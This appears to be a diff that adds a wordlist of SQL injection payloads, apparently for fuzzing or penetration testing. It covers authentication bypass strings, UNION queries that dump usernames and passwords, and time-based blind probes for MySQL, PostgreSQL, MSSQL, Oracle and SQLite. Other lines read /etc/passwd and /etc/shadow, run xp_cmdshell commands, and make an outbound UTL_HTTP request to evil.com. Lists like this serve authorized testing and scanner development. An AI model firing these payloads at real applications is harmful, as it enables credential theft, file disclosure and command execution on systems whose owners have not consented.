@@ -1,0 +1,72 @@
+'
+"
+')
+")
+';
+";
+`)
+`)
+'--
+"--
+'#
+"#
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+') OR ('1'='1
+') OR 1=1--
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+1 AND 1=1--
+1 AND 1=2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' AND pg_sleep(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=randomblob(100000000)--
+' AND BENCHMARK(5000000,MD5(1))--
+'; SELECT SLEEP(5)--
+admin'--
+admin'#
+admin'/*
+' OR 'x'='x
+' OR 'x'='y
+1' ORDER BY 1--
+1' ORDER BY 100--
+1' GROUP BY 1--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT GROUP_CONCAT(username) FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CAST(version() AS int)--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+'; EXEC master..xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'ipconfig'--
+' UNION SELECT pg_read_file('/etc/passwd')--
+' UNION SELECT UTL_HTTP.REQUEST('http://evil.com') FROM dual--
